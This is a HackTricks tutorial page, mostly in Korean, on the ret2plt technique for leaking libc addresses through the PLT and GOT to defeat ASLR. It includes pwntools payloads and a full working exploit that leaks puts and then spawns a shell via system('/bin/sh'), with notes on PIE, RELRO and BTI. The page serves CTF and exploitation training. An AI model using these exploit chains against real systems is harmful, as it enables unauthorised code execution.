# Ret2plt

{{#include ../../../banners/hacktricks-training.md}}

## 기본 정보

이 기법의 목표는 ASLR을 우회하기 위해 **PLT의 함수로부터 주소를 leak 하는 것**입니다. 예를 들어 libc의 함수 `puts`의 주소를 leak하면, **`libc`의 베이스 주소를 계산**하고 다른 함수들에 접근하기 위한 오프셋(예: **`system`**)을 계산할 수 있습니다.

이는 `pwntools` payload로 다음과 같이 수행할 수 있습니다 ([**from here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
PLT의 주소를 사용한 **`puts`**가 GOT(Global Offset Table)에 위치한 `puts`의 주소로 호출되는 것을 주목하라. 이는 `puts`가 puts의 GOT 엔트리를 출력할 때, 해당 **엔트리가 메모리 상의 정확한 `puts` 주소를 포함하고 있게 되기 때문이다**.

또한 익스플로잇에서 `main`의 주소를 사용하기 때문에 `puts`가 실행을 마친 뒤 **바이너리가 `main`을 다시 호출**하여 leak된 주소가 계속 유효하게 된다는 점에 주목하라.

> [!CAUTION]
> 이 동작이 작동하려면 **바이너리가 PIE로 컴파일되어 있어서는 안 된다**거나 PLT, GOT 및 main의 주소를 알기 위해 **PIE를 우회하기 위한 leak을 찾아야 한다**는 점에 유의하라. 그렇지 않으면 먼저 PIE를 우회해야 한다.

You can find a [**full example of this bypass here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass). 이것은 해당 **예제**의 최종 익스플로잇이었다:

<details>
<summary>전체 익스플로잇 예제 (ret2plt leak + system)</summary>
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
</details>

## 현대적 고려사항

- **`-fno-plt` builds** (common in modern distros) replace `call foo@plt` with `call [foo@got]`. If the binary has no `foo@plt` stub, you can still leak the resolved address with `puts(elf.got['foo'])` and then **return directly to the GOT entry** (`flat(padding, elf.got['foo'])`) to jump into libc once lazy binding has completed.
- **Full RELRO / `-Wl,-z,now`**: GOT는 읽기 전용이지만 ret2plt는 여전히 leak을 위해 작동합니다. 그 이유는 GOT 슬롯을 읽기만 하기 때문입니다. 심볼이 한 번도 호출된 적이 없다면, 첫 번째 ret2plt는 lazy binding을 수행하고 해결된 슬롯을 출력할 것입니다.
- **ASLR + PIE**: PIE가 활성화되어 있다면, 먼저 코드 포인터(예: 저장된 리턴 주소, 함수 포인터, 또는 다른 format‑string/infoleak을 통해 얻은 `.plt` 엔트리)를 leak하여 PIE 베이스를 계산한 후, 재배치된 PLT/GOT 주소로 ret2plt 체인을 구성하세요.
- **Non‑x86 architectures with BTI/PAC (AArch64)**: PLT 엔트리는 유효한 BTI landing pad(`bti c`)이므로, BTI가 활성화된 바이너리를 익스플로잇할 때는 BTI가 없는 libc gadget으로 직접 점프하기보다는 PLT stub(또는 다른 BTI‑주석 gadget)으로 점프하는 것을 선호하세요. 그렇지 않으면 CPU가 `BRK`/`PAC` 실패를 일으킬 수 있습니다.
- **Quick resolution helper**: 타깃 함수가 아직 해결되지 않았고 한 번에 leak이 필요하다면, PLT 호출을 두 번 체인하세요: 먼저 `elf.plt['foo']`(해결용) 그다음 다시 `elf.plt['foo']`를 GOT 주소를 인자로 호출하여 이제 채워진 슬롯을 출력합니다.

## 기타 예시 및 참고자료

- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64 bit, ASLR enabled but no PIE, the first step is to fill an overflow until the byte 0x00 of the canary to then call puts and leak it. With the canary a ROP gadget is created to call puts to leak the address of puts from the GOT and the a ROP gadget to call `system('/bin/sh')`
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64 bits, ASLR enabled, no canary, stack overflow in main from a child function. ROP gadget to call puts to leak the address of puts from the GOT and then call an one gadget.

## References

- [MaskRay – All about Procedure Linkage Table](https://maskray.me/blog/2021-09-19-all-about-procedure-linkage-table)

{{#include ../../../banners/hacktricks-training.md}}
